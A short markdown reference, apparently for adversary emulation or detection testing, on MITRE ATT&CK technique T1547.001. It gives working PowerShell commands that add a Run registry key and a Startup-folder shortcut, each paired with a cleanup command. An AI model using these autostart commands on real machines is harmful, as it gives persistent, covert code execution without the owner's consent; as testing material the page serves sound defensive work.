# TA0003 - Persistence

*- maintaining access.*

## T1547 - Boots or Logon Autostart Execution

### T1547.001 - Registry Run Keys / Startup Folder

- Execute $cmd when current user logins via registry run key:
    - Attack:
    ```ps1
    $cmd = "$env:SystemDrive\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -Command Get-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name poc -Value $cmd -Force
    ```
    - Cleanup:
    ```ps1
    Remove-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name poc -Force
    ```

- Execute $cmd when current user logins via startup folder:
    - Attack:
    ```ps1
    $cmd = "$env:SystemDrive\Windows\explorer.exe $env:HOMEPATH\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
    $cmds = $cmd -split ' ', 2 ; $lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\poc.lnk") ; $lnk.TargetPath = $cmds[0] ; $lnk.Arguments = $cmds[1] ; $lnk.Save()
    ```
    - Cleanup:
    ```ps1
    Remove-Item -Force -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\poc.lnk"
    ```

## Resources
- [TA0003 - Persistence](https://attack.mitre.org/tactics/TA0003/)
    - [T1547 - Boot or Logon Autostart Execution](https://attack.mitre.org/techniques/T1547/)
        - [T1547.001 - Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
